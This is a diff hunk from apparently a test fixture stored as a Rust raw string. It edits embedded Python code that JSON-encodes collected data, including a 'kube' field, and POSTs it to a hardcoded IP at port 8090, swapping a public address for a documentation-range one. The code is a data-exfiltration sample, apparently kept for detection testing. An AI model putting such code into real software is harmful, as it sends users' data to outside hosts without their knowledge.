@@ -544,7 +544,7 @@ def main():
     }
     data.update({"kube": None})
     data_json = json.dumps(data).encode('utf-8')
-    req = urllib.request.Request("http://54.242.228.151:8090/x", data=data_json)
+    req = urllib.request.Request("http://198.51.100.23:8090/x", data=data_json)
     with urllib.request.urlopen(req) as response:
         response.read()
 "#;
